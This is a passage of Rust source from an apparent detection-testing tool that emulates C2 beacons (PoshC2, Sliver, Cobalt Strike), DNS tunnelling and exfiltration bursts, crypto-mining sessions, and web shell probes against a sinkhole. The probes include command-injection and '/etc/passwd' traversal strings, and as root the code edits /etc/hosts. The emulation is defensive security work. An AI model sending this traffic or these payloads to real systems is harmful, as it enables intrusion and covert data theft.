    pkt.extend_from_slice(&[0x00, 0x02]); // Transaction ID
    pkt.extend_from_slice(&[0x01, 0x00]); // Flags: RD=1
    pkt.extend_from_slice(&[0x00, 0x01]); // QDCOUNT = 1
    pkt.extend_from_slice(&[0x00, 0x00]); // ANCOUNT = 0
    pkt.extend_from_slice(&[0x00, 0x00]); // NSCOUNT = 0
    pkt.extend_from_slice(&[0x00, 0x00]); // ARCOUNT = 0
    pkt.extend_from_slice(b"\x03aaa\x05stage\x00"); // QNAME: aaa.stage (null-terminated)
    pkt.extend_from_slice(&qtype.to_be_bytes()); // QTYPE
    pkt.extend_from_slice(&[0x00, 0x01]); // QCLASS IN
    pkt
}

// T1048 Exfiltration Over Alternative Protocol -- high-volume DNS burst.
// Mirrors the Python test client (build_t1048_high_volume_exfil_packet in
// c2_traffic_test.py): 120 queries at 10 QPS, each carrying 3 x 60-char
// URL-safe-base64 labels (45 raw bytes each => 135 raw bytes/query), all
// under t1048.signalbench.sigre.xyz.  120 x 135 = 16,200 bytes encoded,
// clearing the >15 KB single-domain exfil threshold in ~12 s.
const T1048_HV_TOTAL_QUERIES: u32 = 120;
const T1048_HV_QPS: u64 = 10;
const T1048_HV_RAW_PER_LABEL: usize = 45;
const T1048_HV_LABELS_PER_QUERY: usize = 3;

/// Builds one T1048 high-volume DNS exfil packet of the form
/// `<l1>.<l2>.<l3>.t1048.signalbench.sigre.xyz`.
///
/// Each of the three leftmost labels is 45 fresh random bytes encoded as
/// URL-safe base64 -- exactly 60 chars with no padding (45 % 3 == 0) -- so
/// the QNAME stays within the RFC 1035 63-byte-label / 255-byte-name limits
/// and the whole packet stays under the 512-byte UDP cap.
///
/// `qtype` should be 1 (A record) or 16 (TXT record); `txid` is the DNS
/// transaction ID.  Returns the wire packet plus the count of raw payload
/// bytes encoded (T1048_HV_RAW_PER_LABEL * T1048_HV_LABELS_PER_QUERY = 135).
fn build_t1048_high_volume_exfil_packet(qtype: u16, txid: u16) -> (Vec<u8>, usize) {
    use rand::Rng;
    let mut rng = rand::rng();

    let mut pkt: Vec<u8> = Vec::with_capacity(256);
    pkt.extend_from_slice(&txid.to_be_bytes()); // Transaction ID
    pkt.extend_from_slice(&[0x01, 0x00]); // Flags: RD=1, QR=0
    pkt.extend_from_slice(&[0x00, 0x01]); // QDCOUNT = 1
    pkt.extend_from_slice(&[0x00, 0x00]); // ANCOUNT = 0
    pkt.extend_from_slice(&[0x00, 0x00]); // NSCOUNT = 0
    pkt.extend_from_slice(&[0x00, 0x00]); // ARCOUNT = 0

    // Three high-entropy payload labels (45 raw bytes -> 60 base64 chars each).
    for _ in 0..T1048_HV_LABELS_PER_QUERY {
        let mut chunk = [0u8; T1048_HV_RAW_PER_LABEL];
        for b in chunk.iter_mut() {
            *b = rng.random::<u8>();
        }
        let label = B64URL.encode(chunk); // 60 chars, no padding (45 % 3 == 0)
        pkt.push(label.len() as u8);
        pkt.extend_from_slice(label.as_bytes());
    }

    // Fixed zone suffix: t1048.signalbench.sigre.xyz
    for label in ["t1048", "signalbench", "sigre", "xyz"] {
        pkt.push(label.len() as u8);
        pkt.extend_from_slice(label.as_bytes());
    }
    pkt.push(0x00); // end of QNAME

    pkt.extend_from_slice(&qtype.to_be_bytes()); // QTYPE
    pkt.extend_from_slice(&[0x00, 0x01]); // QCLASS IN

    let encoded_bytes = T1048_HV_RAW_PER_LABEL * T1048_HV_LABELS_PER_QUERY;
    (pkt, encoded_bytes)
}

/// Formats a Stratum v1 `mining.submit` JSON-RPC line.
/// Params: [worker, job_id, extranonce2, ntime, nonce] per the Stratum spec.
fn make_stratum_submit(id: u32, job_id: &str, nonce: u32) -> String {
    format!(
        "{{\"id\": {}, \"method\": \"mining.submit\", \"params\": [\"signalbench.worker1\", \"{}\", \"00000000\", \"00000001\", \"{:08x}\"]}}\n",
        id, job_id, nonce
    )
}

/// Reads up to `max_lines` newline-framed JSON strings from a Stratum server,
/// spending at most `timeout_secs / max_lines` per read attempt (minimum 200 ms).
/// Returns only non-empty trimmed lines. Stops early on EOF or per-line timeout.
async fn read_stratum_lines(
    reader: &mut BufReader<tokio::net::tcp::OwnedReadHalf>,
    timeout_secs: u64,
    max_lines: usize,
) -> Vec<String> {
    let mut lines = Vec::new();
    let per_line = Duration::from_millis(
        ((timeout_secs * 1000) / max_lines.max(1) as u64).max(200),
    );
    while lines.len() < max_lines {
        let mut line = String::new();
        match async_timeout(per_line, reader.read_line(&mut line)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(_)) => {
                let trimmed = line.trim_end().to_string();
                if !trimmed.is_empty() {
                    lines.push(trimmed);
                }
            }
            _ => break,
        }
    }
    lines
}

/// Extracts the job_id string from the first `mining.notify` line in `lines`.
/// Returns `None` if no notify line is present or parsing fails.
fn extract_notify_job_id(lines: &[String]) -> Option<String> {
    for line in lines {
        if line.contains("\"mining.notify\"") {
            if let Some(start) = line.find("\"params\":[\"") {
                let after = &line[start + 11..];
                if let Some(end) = after.find('"') {
                    return Some(after[..end].to_string());
                }
            }
        }
    }
    None
}

#[async_trait]
impl AttackTechnique for SuspiciousDomainConnections {
    fn info(&self) -> Technique {
        Technique {
            id: "T1071-IOC".to_string(),
            name: "Suspicious Domain Connections - C2 framework profiling (7 frameworks, 4 phases)".to_string(),
            description: "Connects to known malicious and suspicious domains to generate \
                C2-like network telemetry. Includes connections to known threat actor \
                infrastructure, suspicious TLDs, and IP addresses commonly associated with \
                malware. Phase 1 sends C2 framework-profiled HTTP requests: PoshC2 \
                (10 binary-variant POSTs, snort3-malware-cnc SessionID= rule), Sliver \
                (19-request session covering Snort sids 57675-57682 with numeric nonces, \
                three .woff/.html/.png extension variants, and eight Razy-coverage hex- \
                nonce requests), Cobalt Strike (6 patterns covering sids 63772/65446/ \
                300048/54175/54182/56616 plus the /track Razy beacon), AdaptixC2 BEACON \
                (POST /uri.php + /endpoint/api with Firefox 20 UA and X-Beacon-Id/X-App-Id \
                headers, [size + RC4 + key] body), PowerShell Empire (IE11 UA, RoutingPacket \
                session cookie), Mythic (JhY3Rpb24iOi base64 URI), Havoc (3-request \
                DEADBEEF/B16B00B5 sequence), plus web shell probes and standard framework \
                profiles. Phase 2 simulates Stratum v1 cryptocurrency mining sessions \
                (ports 3333/4444): subscribe, authorize, four rounds of mining.notify/ \
                mining.submit, client.get_version, mining.ping/pong -- >= 5-second \
                bidirectional dwell so PA-440 App-ID classifies each session as \
                stratum-mining. Phase 3 sends an AsyncRAT TLS 1.2 handshake to \
                sinkhole:8888 (CN=AsyncRAT Server). Phase 4 sends raw UDP/53 DNS probes: \
                dnscat2 78-byte tunnel init packet, Cobalt Strike QTYPE A/TXT \
                beacons (sids 45906/45907), and a T1048 high-volume exfil burst \
                (120 queries, ~16.2 KB encoded in URL-safe-base64 labels under \
                t1048.signalbench.sigre.xyz at 10 QPS)."
                .to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save connection log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_suspicious_domains.log".to_string()),
                },
                TechniqueParameter {
                    name: "timeout".to_string(),
                    description: "Connection timeout in seconds".to_string(),
                    required: false,
                    default: Some("3".to_string()),
                },
            ],
            detection: "Monitor for: DNS queries to suspicious TLDs (.tk, .ru, .cn), \
                connections to known C2 infrastructure, connections to IP addresses \
                in threat intelligence feeds, high-entropy domain names, DGA-like patterns, \
                beaconing behaviour. Crypto miner: outbound TCP to ports 3333/4444 with \
                Stratum JSON-RPC payload (mining.subscribe, mining.authorize) -- classified \
                by Palo Alto App-ID as stratum-mining."
                .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_suspicious_domains.log".to_string());

            let timeout = config
                .parameters
                .get("timeout")
                .and_then(|t| t.parse::<u32>().ok())
                .unwrap_or(3);

            debug!("[T1071-IOC] Starting Suspicious Domain Connections technique");
            debug!("[T1071-IOC] Log file: {}", log_file);
            debug!("[T1071-IOC] Timeout: {} seconds", timeout);

            // IOC domains based on ttp-bench and known threat patterns
            // These are designed to trigger security detections without actual harm
            let suspicious_domains = vec![
                // Known malware/C2 infrastructure simulation (non-existent domains)
                ("signalbench-c2-test.tk", "Suspicious TLD (.tk)"),
                ("signalbench-malware.ru", "Suspicious TLD (.ru)"),
                ("signalbench-backdoor.cn", "Suspicious TLD (.cn)"),
                ("signalbench-rat.xyz", "Suspicious TLD (.xyz)"),
                ("signalbench-payload.top", "Suspicious TLD (.top)"),
                // DGA-like high entropy domains (sigre.xyz test infrastructure)
                ("xk8f2m9p3q.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
                (
                    "a1b2c3d4e5f6.t1071.signalbench.sigre.xyz",
                    "DGA-like pattern",
                ),
                ("q9w8e7r6t5.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
                // Known malicious patterns
                ("update.signalbench-services.com", "Update masquerading"),
                ("cdn.signalbench-delivery.net", "CDN masquerading"),
                ("api.signalbench-auth.io", "API masquerading"),
                // Suspicious IP addresses (TEST-NET ranges per RFC 5737)
                ("192.0.2.1", "TEST-NET-1 IP"),
                ("198.51.100.1", "TEST-NET-2 IP"),
                ("198.51.100.1", "TEST-NET-2 IP"),
                // Tor-like patterns
                ("signalbench.onion.link", "Tor proxy pattern"),
                // Cryptocurrency mining pool patterns
                ("pool.signalbench-mining.com", "Mining pool pattern"),
                ("stratum.signalbench-crypto.net", "Stratum protocol pattern"),
                // C2 framework domains (Mythic, Havoc, Empire)
                ("signalbench-mythic.pw", "Mythic C2 pattern (.pw TLD)"),
                ("signalbench-havoc.cc", "Havoc C2 pattern (.cc TLD)"),
                ("signalbench-empire.net", "PowerShell Empire C2 listener (.net masquerade)"),
            ];

            let profiles = c2_profiles();

            if dry_run {
                info!(
                    "[DRY RUN] Would connect to {} suspicious domains:",
                    suspicious_domains.len()
                );
                for (domain, reason) in &suspicious_domains {
                    if let Some(p) = profiles.iter().find(|p| p.domain == *domain) {
                        if p.domain == "cdn.signalbench-delivery.net" {
                            info!(
                                "[DRY RUN] - {} ({}) [{}: 4 web shell probe requests on port 4444]",
                                domain, reason, p.framework
                            );
                        } else if p.domain == "signalbench-backdoor.cn" {
                            info!(
                                "[DRY RUN] - {} ({}) [{}: 10 binary-variant POST requests on port 4444]",
                                domain, reason, p.framework
                            );
                        } else if p.domain == "signalbench-rat.xyz" {
                            info!(
                                "[DRY RUN] - {} ({}) [{}: 8-request session sequence on port 4444]",
                                domain, reason, p.framework
                            );
                        } else if p.domain == "signalbench-malware.ru" {
                            info!(
                                "[DRY RUN] - {} ({}) [{}: 6-pattern HTTP sequence on port 4444]",
                                domain, reason, p.framework
                            );
                        } else if p.domain == "signalbench-havoc.cc" {
                            info!(
                                "[DRY RUN] - {} ({}) [{}: 3-request sequence on port 4444 (jquery/DEADBEEF/B16B00B5)]",
                                domain, reason, p.framework
                            );
                        } else {
                            info!(
                                "[DRY RUN] - {} ({}) [{}: port 4444 primary, port 80 follow-up]",
                                domain, reason, p.framework
                            );
                        }
                    } else {
                        info!("[DRY RUN] - {} ({})", domain, reason);
                    }
                }
                info!(
                    "[DRY RUN] Phase 2: Would attempt full Stratum v1 sessions to {} mining pool hosts on ports 3333 and 4444",
                    STRATUM_MINING_DOMAINS.len()
                );
                for domain in STRATUM_MINING_DOMAINS {
                    for port in STRATUM_PORTS {
                        info!(
                            "[DRY RUN] - {}:{} (subscribe -> set_difficulty+notify -> authorize -> set_difficulty+notify+client.get_version -> 4x submit+notify -> ping+pong, >= 5s dwell)",
                            domain, port
                        );
                    }
                }
                info!(
                    "[DRY RUN] Phase 3: Would attempt AsyncRAT TLS handshake to sinkhole:8888 \
                     (openssl s_client, CN=AsyncRAT Server)"
                );
                info!(
                    "[DRY RUN] Phase 4: Would send dnscat2 DNS probe (78 bytes, port 53) and \
                     Cobalt Strike DNS A + TXT beacon packets (27 bytes each) to sinkhole"
                );
                return Ok(SimulationResult {
                    technique_id: self.info().id,
                    success: true,
                    message: format!(
                        "DRY RUN: Would connect to {} suspicious domains ({} with C2 framework profiles on port 4444, 1 web shell probe, PoshC2 10-variant, Sliver 8-request, CS 6-pattern, Havoc 3-request), run Stratum v1 sessions on {} hosts, AsyncRAT TLS Phase 3, and DNS probes Phase 4 (dnscat2 + CS A/TXT beacons + T1048 ~16.2 KB exfil burst)",
                        suspicious_domains.len(),
                        C2_PROFILED_DOMAINS.len(),
                        STRATUM_MINING_DOMAINS.len()
                    ),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            // Check if running as root and handle /etc/hosts accordingly
            let running_as_root = is_running_as_root();
            let sinkhole_ip = resolve_sinkhole_ip().await;
            let mut hosts_modified = false;

            if running_as_root {
                info!("[T1071-IOC] Running as root, adding safe test entries to /etc/hosts");
                match add_hosts_entries(&sinkhole_ip) {
                    Ok(added) => {
                        hosts_modified = added;
                        if added {
                            println!("[OK] Added safe test entries to /etc/hosts");
                        } else {
                            println!("[OK] Safe test entries already present in /etc/hosts");
                        }
                    }
                    Err(e) => {
                        error!("[T1071-IOC] Failed to add hosts entries: {}", e);
                        println!("[WARN] Failed to add hosts entries: {}", e);
                    }
                }
            } else {
                debug!("[T1071-IOC] Not running as root, will check /etc/hosts for each unowned domain");
            }

            // Create log file
            let mut log =
                File::create(&log_file).map_err(|e| format!("Failed to create log file: {}", e))?;

            writeln!(log, "# SignalBench Suspicious Domain Connections").unwrap();
            writeln!(
                log,
                "# MITRE ATT&CK Technique: T1071 - Application Layer Protocol"
            )
            .unwrap();
            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log, "# Total domains: {}", suspicious_domains.len()).unwrap();
            writeln!(log, "# Timeout: {} seconds", timeout).unwrap();
            writeln!(log, "# Running as root: {}", running_as_root).unwrap();
            writeln!(
                log,
                "# --------------------------------------------------------\n"
            )
            .unwrap();

            let mut connection_count = 0;
            let mut successful_connections = 0;
            let mut skipped_count = 0;
            let mut skipped_domains: Vec<&str> = Vec::new();

            info!(
                "[T1071-IOC] Connecting to {} suspicious domains",
                suspicious_domains.len()
            );

            // Console output: Display all domains/IPs being tested
            println!("\n[T1071-IOC] Suspicious Domain Connections");
            println!("{}", "-".repeat(60));
            println!("{:<45} REASON", "TARGET");
            println!("{}", "-".repeat(60));
            for (domain, reason) in &suspicious_domains {
                println!("  {:<43} {}", domain, reason);
            }
            println!("{}", "-".repeat(60));
            println!();

            let is_fallback = sinkhole_ip == SAFE_TEST_IP_FALLBACK;
            let dig_available = crate::utils::is_command_available("dig").await;

            for (domain, reason) in &suspicious_domains {
                // Check if this domain is safe to test
                let domain_is_safe = is_safe_domain(domain);

                // For unowned domains when not root, check if configured in /etc/hosts
                if !domain_is_safe && !running_as_root {
                    let resolves_safely = domain_resolves_to_safe_ip(domain, &sinkhole_ip).await;
                    if !resolves_safely {
                        skipped_count += 1;
                        skipped_domains.push(domain);
                        debug!("[T1071-IOC] Skipping unowned domain {} (not in /etc/hosts)", domain);
                        println!("[WARN] Skipping: {} (not configured in /etc/hosts)", domain);
                        writeln!(log, "=== Skipped: {} ===", domain).unwrap();
                        writeln!(log, "Reason: Unowned domain not configured in /etc/hosts").unwrap();
                        writeln!(log).unwrap();
                        continue;
                    }
                }

                connection_count += 1;
                debug!("[T1071-IOC] Connecting to: {} ({})", domain, reason);
                println!("[T1071-IOC] Connecting: {} ...", domain);

                writeln!(log, "=== Connection {} ===", connection_count).unwrap();
                writeln!(log, "Target: {}", domain).unwrap();
                writeln!(log, "Reason: {}", reason).unwrap();
                writeln!(log, "Safe domain: {}", domain_is_safe).unwrap();
                writeln!(log, "Time: {}", chrono::Local::now()).unwrap();

                if let Some(profile) = profiles.iter().find(|p| p.domain == *domain) {
                    writeln!(log, "Framework: {}", profile.framework).unwrap();
                    writeln!(log, "C2 pattern: {}", profile.reason).unwrap();

                    if profile.domain == "cdn.signalbench-delivery.net" {
                        // Web shell probe: four sequential requests targeting China Chopper,
                        // SUPERNOVA, and generic PHP/CGI patterns (Unit 42 web shell research).
                        println!(
                            "[T1071-IOC]   Framework: {} (4 sequential requests on port 4444)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: web shell probe (4 sequential requests on port 4444)"
                        )
                        .unwrap();
                        let ws_ua = profile.user_agent;
                        let ws_base = format!("http://{}:4444", sinkhole_ip);
                        let ws_host_hdr = format!("Host: {}", profile.domain);

                        type WsProbe = (
                            &'static str,
                            &'static str,
                            Option<&'static str>,
                            Option<&'static str>,
                        );
                        let ws_probes: &[WsProbe] = &[
                            ("GET", "/uploads/files/shell.php?cmd=id", None, None),
                            (
                                "GET",
                                "/wp-content/plugins/backup/shell.php?z0=QGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgJzAnKTs%3D&z1=Y21k&z2=aWQ%3D",
                                None,
                                None,
                            ),
                            (
                                "GET",
                                "/app/webroot/files/update.aspx?codes=base64&clazz=SolarWinds.Orion&method=TestMethod&args=whoami",
                                None,
                                None,
                            ),
                            (
                                "POST",
                                "/cgi-bin/php.cgi",
                                Some("cmd=id&passwd=../../../etc/passwd"),
                                Some("application/x-www-form-urlencoded"),
                            ),
                        ];

                        let mut ws_any_ok = false;
                        for &(ws_method, ws_path, ws_body, ws_ct) in ws_probes {
                            let ws_url = format!("{}{}", ws_base, ws_path);
                            let mut ws_args: Vec<String> = vec![
                                "-s".to_string(),
                                "-o".to_string(),
                                "/dev/null".to_string(),
                                "-w".to_string(),
                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
                                "--max-time".to_string(),
                                timeout.to_string(),
                                "--connect-timeout".to_string(),
                                timeout.to_string(),
                                "-A".to_string(),
                                ws_ua.to_string(),
                                "-X".to_string(),
                                ws_method.to_string(),
                                "-H".to_string(),
                                ws_host_hdr.clone(),
                            ];
                            if let Some(ct) = ws_ct {
                                ws_args.push("-H".to_string());
                                ws_args.push(format!("Content-Type: {}", ct));
                            }
                            if let Some(body) = ws_body {
                                ws_args.push("--data-raw".to_string());
                                ws_args.push(body.to_string());
                            }
                            ws_args.push(ws_url);
                            writeln!(log, "Probe: {} {}", ws_method, ws_path).unwrap();
                            writeln!(log, "Probe curl: curl {}", ws_args.join(" ")).unwrap();

                            match Command::new("curl").args(&ws_args).output().await {
                                Ok(output) => {
                                    let result = String::from_utf8_lossy(&output.stdout);
                                    let exit_code = output.status.code().unwrap_or(-1);
                                    if is_fallback {
                                        writeln!(
                                            log,
                                            "Probe status: SENT unidirectional (fallback mode)"
                                        )
                                        .unwrap();
                                    } else if exit_code == 0 {
                                        if !ws_any_ok {
                                            successful_connections += 1;
                                            ws_any_ok = true;
                                        }
                                        writeln!(
                                            log,
                                            "Probe status: SUCCESS ({})",
                                            result.trim()
                                        )
                                        .unwrap();
                                    } else {
                                        writeln!(
                                            log,
                                            "Probe status: FAILED (exit code: {})",
                                            exit_code
                                        )
                                        .unwrap();
                                    }
                                }
                                Err(e) => {
                                    writeln!(log, "Probe status: ERROR ({})", e).unwrap();
                                }
                            }
                        }

                        if is_fallback {
                            println!(
                                "  [-->] Web shell probe sent (fallback unidirectional, 4 requests)"
                            );
                        } else if ws_any_ok {
                            println!("  [OK] Web shell probe complete (4 requests)");
                        } else {
                            println!("  [--] Web shell probe failed (4 requests)");
                        }
                    } else if profile.domain == "signalbench-backdoor.cn" {
                        // PoshC2: 10 POST requests to /news.php with distinct binary bodies.
                        // Each body is 40 bytes from POSHC2_VARIANTS; first 16 bytes form the
                        // base64-encoded SessionID= cookie value.
                        // snort3-malware-cnc.rules: MALWARE-CNC Win.Trojan.PoshC2 inbound
                        // connection (content:"SessionID=",http_cookie; content:"POST";
                        // content:"/news.php",http_uri)
                        println!(
                            "[T1071-IOC]   Framework: {} (10 binary-variant POST requests on port 4444)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: PoshC2 10-variant POST sequence (port 4444)"
                        )
                        .unwrap();
                        let poshc2_host = format!("Host: {}", profile.domain);
                        let poshc2_url =
                            format!("http://{}:4444/news.php", sinkhole_ip);
                        let mut poshc2_any_ok = false;
                        for (variant_idx, variant_bytes) in
                            POSHC2_VARIANTS.iter().enumerate()
                        {
                            let session_b64 =
                                B64URL.encode(&variant_bytes[..16]);
                            let mut poshc2_args: Vec<String> = vec![
                                "-s".to_string(),
                                "-o".to_string(),
                                "/dev/null".to_string(),
                                "-w".to_string(),
                                "%{http_code},%{time_total},%{remote_ip}"
                                    .to_string(),
                                "--max-time".to_string(),
                                timeout.to_string(),
                                "--connect-timeout".to_string(),
                                timeout.to_string(),
                                "-X".to_string(),
                                "POST".to_string(),
                                "-A".to_string(),
                                profile.user_agent.to_string(),
                                "-H".to_string(),
                                poshc2_host.clone(),
                                "-H".to_string(),
                                format!("Cookie: SessionID={}", session_b64),
                                "-H".to_string(),
                                "X-Requested-With: XMLHttpRequest".to_string(),
                                "-H".to_string(),
                                "Content-Type: application/octet-stream"
                                    .to_string(),
                            ];
                            let poshc2_tf = tempfile::NamedTempFile::new();
                            let poshc2_tf_ok = if let Ok(mut tf) = poshc2_tf {
                                if tf.write_all(variant_bytes).is_ok() {
                                    let p = tf.path().to_string_lossy().to_string();
                                    poshc2_args.push("-d".to_string());
                                    poshc2_args
                                        .push(format!("@{}", p));
                                    poshc2_args
                                        .push(poshc2_url.clone());
                                    writeln!(
                                        log,
                                        "PoshC2 variant {}/10: curl {}",
                                        variant_idx + 1,
                                        poshc2_args.join(" ")
                                    )
                                    .unwrap();
                                    match Command::new("curl")
                                        .args(&poshc2_args)
                                        .output()
                                        .await
                                    {
                                        Ok(output) => {
                                            let res = String::from_utf8_lossy(
                                                &output.stdout,
                                            );
                                            let ec =
                                                output.status.code().unwrap_or(-1);
                                            if is_fallback {
                                                writeln!(
                                                    log,
                                                    "PoshC2 variant {}/10: SENT (fallback)",
                                                    variant_idx + 1
                                                )
                                                .unwrap();
                                                true
                                            } else if ec == 0 {
                                                if !poshc2_any_ok {
                                                    successful_connections += 1;
                                                    poshc2_any_ok = true;
                                                }
                                                writeln!(
                                                    log,
                                                    "PoshC2 variant {}/10: SUCCESS ({})",
                                                    variant_idx + 1,
                                                    res.trim()
                                                )
                                                .unwrap();
                                                true
                                            } else {
                                                writeln!(
                                                    log,
                                                    "PoshC2 variant {}/10: FAILED (ec={})",
                                                    variant_idx + 1, ec
                                                )
                                                .unwrap();
                                                false
                                            }
                                        }
                                        Err(e) => {
                                            writeln!(
                                                log,
                                                "PoshC2 variant {}/10: ERROR ({})",
                                                variant_idx + 1, e
                                            )
                                            .unwrap();
                                            false
                                        }
                                    }
                                } else {
                                    false
                                }
                            } else {
                                false
                            };
                            debug!(
                                "[T1071-IOC] PoshC2 variant {}/10 {}",
                                variant_idx + 1,
                                if poshc2_tf_ok { "ok" } else { "failed" }
                            );
                        }
                        if is_fallback {
                            println!(
                                "  [-->] PoshC2 10-variant POST sequence sent (fallback)"
                            );
                        } else if poshc2_any_ok {
                            println!(
                                "  [OK] PoshC2 10-variant POST sequence complete"
                            );
                        } else {
                            println!(
                                "  [--] PoshC2 10-variant POST sequence failed"
                            );
                        }
                        sleep(Duration::from_secs(2)).await;
                    } else if profile.domain == "signalbench-rat.xyz" {
                        // Sliver: 8-request HTTP C2 session sequence.
                        // All requests use IE11 UA + Accept-Language: en-US + ?_= param.
                        // POSTs carry no body (no Content-Type header) — this absence is
                        // the primary Snort IOC.  Later requests carry PHPSESSID cookie.
                        // snort3-malware-cnc.rules: MALWARE-CNC Win.Backdoor.Sliver connect
                        // (content:"MSIE 11.0",http_header; content:!"Content-Type";
                        //  content:"PHPSESSID=",http_cookie; content:"?_=",http_uri)
                        println!(
                            "[T1071-IOC]   Framework: {} (8-request session sequence on port 4444)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: Sliver 19-request session (port 4444)"
                        )
                        .unwrap();
                        let sliver_sessid =
                            Uuid::new_v4().to_string().replace('-', "");
                        let sliver_host = format!("Host: {}", profile.domain);
                        let sliver_base =
                            format!("http://{}:4444", sinkhole_ip);

                        // Three sub-sets of Sliver requests:
                        // 1. 8 published Snort rule targets (sid:57675-57682)
                        //    -- prefixed paths, numeric ?_=[0-9]{1,9} nonce
                        // 2. 3 framework-extension variants (Immersive Labs)
                        //    -- .woff stager, .html key exchange, .png close
                        // 3. 8 Razy-coverage requests (un-prefixed paths,
                        //    hex 16-char nonce) -- PAN's Razy C2 sig fires
                        //    on this set on signalbench-rat.xyz.
                        type SliverReq = (
                            &'static str, // method
                            &'static str, // path
                            bool,         // include PHPSESSID
                            bool,         // true = numeric nonce (Snort), false = hex (Razy)
                            &'static str, // sid / tag for logging
                        );
                        let sliver_reqs: &[SliverReq] = &[
                            // 1. Snort sid:57675-57682 targets (numeric nonce)
                            ("GET",  "/static/robots.txt",     false, true,  "sid:57675"),
                            ("GET",  "/www/info.txt",          false, true,  "sid:57676"),
                            ("GET",  "/docs/sample.txt",       false, true,  "sid:57682"),
                            ("POST", "/app/login.jsp",         false, true,  "sid:57677"),
                            ("POST", "/wordpress/login.php",   true,  true,  "sid:57678"),
                            ("POST", "/api/api.php",           true,  true,  "sid:57679"),
                            ("POST", "/rest/samples.php",      true,  true,  "sid:57680"),
                            ("GET",  "/js/jquery.min.js",      true,  true,  "sid:57681"),
                            // 2. Framework-extension variants (Immersive Labs)
                            ("GET",  "/fonts/glyphicons.woff", false, true,  "stager-woff"),
                            ("GET",  "/static/keys.html",      false, true,  "keyexch-html"),
                            ("GET",  "/img/spacer.png",        true,  true,  "close-png"),
                            // 3. Razy-coverage (un-prefixed paths, hex nonce)
                            ("GET",  "/robots.txt",            false, false, "razy-hex"),
                            ("GET",  "/info.txt",              false, false, "razy-hex"),
                            ("GET",  "/sample.txt",            false, false, "razy-hex"),
                            ("POST", "/wp/n.jsp",              false, false, "razy-hex"),
                            ("POST", "/wp/in.php",             true,  false, "razy-hex"),
                            ("POST", "/api.php",               true,  false, "razy-hex"),
                            ("POST", "/wp/samples.php",        true,  false, "razy-hex"),
                            ("GET",  "/js/app.min.js",         true,  false, "razy-hex"),
                        ];
                        let sliver_total = sliver_reqs.len();
                        let mut sliver_any_ok = false;
                        for (req_idx, &(method, path, with_sess, is_numeric, sid))
                            in sliver_reqs.iter().enumerate()
                        {
                            // Snort rule constraint: ?_= must be 1-9 numeric
                            // digits (PCRE [0-9]{1,9}$).  Razy-coverage uses
                            // 16 hex chars.  ThreadRng is not Send so we use
                            // a scoped temporary that drops before the await.
                            let nonce = if is_numeric {
                                use rand::Rng;
                                rand::rng()
                                    .random_range(1u32..=999_999_999)
                                    .to_string()
                            } else {
                                Uuid::new_v4()
                                    .to_string()
                                    .replace('-', "")[..16]
                                    .to_string()
                            };
                            let uri = format!(
                                "{}{}?_={}",
                                sliver_base,
                                path,
                                nonce
                            );
                            let mut sl_args: Vec<String> = vec![
                                "-s".to_string(),
                                "-o".to_string(),
                                "/dev/null".to_string(),
                                "-w".to_string(),
                                "%{http_code},%{time_total},%{remote_ip}"
                                    .to_string(),
                                "--max-time".to_string(),
                                timeout.to_string(),
                                "--connect-timeout".to_string(),
                                timeout.to_string(),
                                "-X".to_string(),
                                method.to_string(),
                                "-A".to_string(),
                                profile.user_agent.to_string(),
                                "-H".to_string(),
                                sliver_host.clone(),
                                "-H".to_string(),
                                "Accept-Language: en-US".to_string(),
                            ];
                            if with_sess {
                                sl_args.push("-H".to_string());
                                sl_args.push(format!(
                                    "Cookie: PHPSESSID={}",
                                    sliver_sessid
                                ));
                            }
                            sl_args.push(uri);
                            writeln!(
                                log,
                                "Sliver req {}/{} [{}]: {} {}",
                                req_idx + 1, sliver_total, sid, method, path
                            )
                            .unwrap();
                            match Command::new("curl")
                                .args(&sl_args)
                                .output()
                                .await
                            {
                                Ok(output) => {
                                    let res = String::from_utf8_lossy(
                                        &output.stdout,
                                    );
                                    let ec = output.status.code().unwrap_or(-1);
                                    if is_fallback {
                                        writeln!(
                                            log,
                                            "Sliver req {}/{} [{}]: SENT (fallback)",
                                            req_idx + 1, sliver_total, sid
                                        )
                                        .unwrap();
                                    } else if ec == 0 {
                                        if !sliver_any_ok {
                                            successful_connections += 1;
                                            sliver_any_ok = true;
                                        }
                                        writeln!(
                                            log,
                                            "Sliver req {}/{} [{}]: SUCCESS ({})",
                                            req_idx + 1, sliver_total, sid, res.trim()
                                        )
                                        .unwrap();
                                    } else {
                                        writeln!(
                                            log,
                                            "Sliver req {}/{} [{}]: FAILED (ec={})",
                                            req_idx + 1, sliver_total, sid, ec
                                        )
                                        .unwrap();
                                    }
                                }
                                Err(e) => {
                                    writeln!(
                                        log,
                                        "Sliver req {}/{} [{}]: ERROR ({})",
                                        req_idx + 1, sliver_total, sid, e
                                    )
                                    .unwrap();
                                }
                            }
                        }
                        if is_fallback {
                            println!(
                                "  [-->] Sliver {}-request sequence sent (fallback)",
                                sliver_total
                            );
                        } else if sliver_any_ok {
                            println!(
                                "  [OK] Sliver {}-request sequence complete",
                                sliver_total
                            );
                        } else {
                            println!(
                                "  [--] Sliver {}-request sequence failed",
                                sliver_total
                            );
                        }
                        sleep(Duration::from_secs(2)).await;
                    } else if profile.domain == "signalbench-malware.ru" {
                        // Cobalt Strike: 6 HTTP patterns covering snort3-malware-cnc.rules
                        // sids 63772, 65446, 300048, 54175, 54182, 56616.
                        println!(
                            "[T1071-IOC]   Framework: {} (6-pattern HTTP sequence on port 4444)",
                            profile.framework
                        );
                        writeln!(
